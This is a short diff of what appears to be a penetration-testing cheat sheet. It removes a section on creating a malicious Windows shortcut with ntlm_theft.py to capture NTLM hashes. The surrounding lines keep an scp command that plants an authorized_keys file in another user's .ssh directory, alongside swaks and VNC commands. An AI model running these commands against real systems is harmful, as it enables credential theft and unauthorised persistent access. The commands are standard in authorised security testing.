@@ -222,12 +222,6 @@ swaks --server smtp.example.com \
 vncviewer 192.168.0.10:1
 ```
 ---
-# Create malicious Windows file
-```bash
-python3 ntlm_theft.py -g lnk -s <ip> -f vault
-```
-- https://github.com/Greenwolf/ntlm_theft
----
 # scp
 ```bash
 scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
